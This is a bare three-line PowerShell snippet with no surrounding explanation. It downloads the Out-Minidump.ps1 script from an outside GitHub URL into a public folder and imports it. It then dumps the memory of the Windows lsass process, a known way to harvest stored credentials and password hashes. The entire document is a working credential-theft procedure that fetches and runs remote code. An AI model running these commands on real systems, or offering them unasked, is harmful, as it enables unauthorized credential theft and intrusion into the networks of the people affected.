(New-Object System.Net.WebClient).DownloadFile("https://raw.githubusercontent.com/ExploitGF/power/master/Out-Minidump.ps1","C:\Users\Public\dump.ps1")
import-module C:\Users\Public\dump.ps1
Get-Process lsass | Out-Minidump -DumpFilePath C:\Users\Public
